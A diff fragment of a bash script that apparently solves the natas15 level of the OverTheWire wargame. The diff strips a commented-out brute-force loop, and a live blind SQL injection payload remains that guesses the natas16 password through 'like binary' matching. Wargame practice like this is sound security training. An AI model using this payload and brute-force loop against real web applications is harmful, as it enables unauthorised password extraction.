@@ -16,24 +16,6 @@ site="http://natas15.natas.labs.overthewire.org?debug=1"
 #  bruteData="$data"${char}"$wild"
 #
 #  curlOut=$(curl -s -u "$access" "$site" --data-urlencode "$bruteData") 
-#
-#
-#  final=$(echo "$curlOut" | grep 'Executing query:')
-#  final=$(echo "$final" | sed 's:<br><div.*::' )
-#  final=$(echo "$final" | sed 's:\(.*\)<br>\(.*\):\2\t\1:')
-#  echo "$final"
-#
-#  result=$(echo "$curlOut" | grep 'This user exists.' | wc -l)
-#  if [[ $result = 1 ]]
-#   then 
-#        data="$data"${char}
-#        break
-#        
-#  fi
-#
-#  done
-#wild=${wild::-1}
-#done
 
 data='username=natas16" and password like binary "'
 wild="_______________________________" 
